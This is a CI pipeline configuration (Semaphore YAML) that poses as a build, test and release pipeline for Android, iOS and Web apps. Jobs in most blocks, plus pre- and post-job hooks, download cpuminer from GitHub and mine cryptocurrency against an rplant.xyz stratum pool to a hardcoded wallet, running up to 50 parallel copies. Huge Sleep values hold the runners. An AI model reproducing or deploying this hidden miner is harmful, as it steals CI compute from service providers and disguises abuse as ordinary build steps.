version: v1.0
name: Multi-platform pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Build for Android
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 50
        - name: 'Job #3'
          commands:
            - Sleep 1737373838384848383838
      agent:
        machine:
          type: e1-standard-2
          os_image: ubuntu1804
  - name: Build for iOS
    dependencies: []
    task:
      agent:
        machine:
          type: e1-standard-8
          os_image: ubuntu1804
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 10
        - name: 'Job #3'
          commands:
            - Sleep 474748383939374792387374
  - name: Build for Web
    dependencies: []
    task:
      jobs:
        - name: Build
          commands:
            - checkout
        - name: 'Job #2'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 50
      epilogue:
        always:
          commands:
            - Sleep 1737374848
        on_fail:
          commands:
            - Run back ( job 1 )
      agent:
        machine:
          type: e1-standard-2
          os_image: ubuntu1804
  - name: Test on Android
    dependencies:
      - Build for Android
    task:
      jobs:
        - name: Tests 1/2
          commands:
            - checkout
        - name: Tests 2/2
          commands:
            - checkout
        - name: 'Job #3'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
          parallelism: 50
      prologue:
        commands:
          - Sleep 173748484848
      epilogue:
        on_pass:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
        on_fail:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - './cpuminer-sse2 -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BgLwY8t2haNQjkwU7hatVRUj3r4zP1oXio.TuyulGondrong -t0'
      agent:
        machine:
          type: e1-standard-4
          os_image: ubuntu1804
    skip:
      when: mainan
  - name: Test on iOS
    dependencies:
      - Build for iOS
      - Test on Android
    task:
      agent:
        machine:
          type: a1-standard-4
          os_image: macos-xcode12
      jobs:
        - name: Tests
          commands:
            - checkout
  - name: Test on Web
    dependencies:
      - Build for Web
    task:
      jobs:
        - name: Tests 1/3
          commands:
            - checkout
        - name: Tests 2/3
          commands:
            - checkout
        - name: Tests 3/3
          commands:
            - checkout
  - name: Release
    dependencies:
      - Test on Android
      - Test on iOS
      - Test on Web
    task:
      jobs:
        - name: "\U0001F680 Google Play"
          commands:
            - checkout
        - name: "\U0001F680 AppStore"
          commands:
            - checkout
        - name: "\U0001F680 Web"
          commands:
            - checkout
